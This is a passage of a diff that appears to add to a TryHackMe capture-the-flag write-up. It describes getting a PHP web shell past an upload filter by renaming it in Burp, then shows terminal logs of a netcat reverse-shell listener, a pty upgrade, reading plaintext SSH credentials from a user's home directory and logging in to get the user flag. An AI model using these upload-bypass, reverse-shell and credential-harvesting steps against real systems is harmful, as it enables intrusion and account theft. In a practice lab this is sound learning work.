@@ -499,3 +499,90 @@ http://10.112.163.38:1337/file1010111/index.php?file=test
 > [!note]
 > Managed to get the shell.php file uploaded vvia burp repeater after intercepting initial file upload request as shell.php.png to allow therequest through and trick the file upload and change to shell.php and it was a success as shown in the response image.
 
+```
+root@ip-10-114-71-118:~# nc -lvnp 4445
+Listening on 0.0.0.0 4445
+Connection received on 10.114.136.24 58060
+Linux ip-10-114-136-24 5.15.0-1039-aws #44~20.04.1-Ubuntu SMP Thu Jun 22 12:21:12 UTC 2023 x86_64 x86_64 x86_64 GNU/Linux
+ 21:13:40 up 17 min,  0 users,  load average: 0.02, 0.01, 0.02
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+/bin/sh: 0: can't access tty; job control turned off
+$ python3 -c 'import pty ;pty.spawn("/bin/bash")'
+www-data@ip-10-114-136-24:/$ export xterm=TERM
+export xterm=TERM
+www-data@ip-10-114-136-24:/$ clear
+clear
+TERM environment variable not set.
+www-data@ip-10-114-136-24:/$ export TERM=xterm
+export TERM=xterm
+www-data@ip-10-114-136-24:/$ ls
+ls
+'"'     dev    lib     libx32	    mnt    root   snap	 tmp
+ bin    etc    lib32   lost+found   opt    run	  srv	 usr
+ boot   home   lib64   media	    proc   sbin   sys	 var
+www-data@ip-10-114-136-24:/$ cd home
+cd home
+www-data@ip-10-114-136-24:/home$ ls
+ls
+ubuntu	zeamkish
+www-data@ip-10-114-136-24:/home$ cd zeamkish
+cd zeamkish
+www-data@ip-10-114-136-24:/home/zeamkish$ ls
+ls
+flag.txt  ssh_creds.txt
+www-data@ip-10-114-136-24:/home/zeamkish$ cat flag.txt
+cat flag.txt
+cat: flag.txt: Permission denied
+www-data@ip-10-114-136-24:/home/zeamkish$ cat ssh_creds.txt
+cat ssh_creds.txt
+SSH CREDS
+zeamkish
+easytohack@123
+```
+```
+root@ip-10-114-71-118:~# ssh zeamkish@10.114.136.24
+The authenticity of host '10.114.136.24 (10.114.136.24)' can't be established.
+ECDSA key fingerprint is SHA256:JLtJwMkNk1ePoiiKms6nSJC60tB7dz4axXvU2/yQbmU.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '10.114.136.24' (ECDSA) to the list of known hosts.
+zeamkish@10.114.136.24's password: 
+Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.15.0-1039-aws x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+  System information as of Sun Mar  1 21:16:34 UTC 2026
+
+  System load:  0.05              Processes:             126
+  Usage of /:   7.3% of 58.09GB   Users logged in:       0
+  Memory usage: 16%               IPv4 address for eth0: 10.114.136.24
+  Swap usage:   0%
+
+ * Ubuntu Pro delivers the most comprehensive open source security and
+   compliance features.
+
+   https://ubuntu.com/aws/pro
+
+Expanded Security Maintenance for Applications is not enabled.
+
+0 updates can be applied immediately.
+
+Enable ESM Apps to receive additional future security updates.
+See https://ubuntu.com/esm or run: sudo pro status
+
+
+The list of available updates is more than a week old.
+To check for new updates run: sudo apt update
+
+Last login: Sun Jul  2 17:27:46 2023 from 10.10.83.109
+zeamkish@ip-10-114-136-24:~$ ls
+flag.txt  ssh_creds.txt
+zeamkish@ip-10-114-136-24:~$ cat flag.txt
+THM{USER_FLAG_1231_EXPOSE}
+zeamkish@ip-10-114-136-24:~$ 
+```
+
+> [!note]
+> For some reason my VPN 
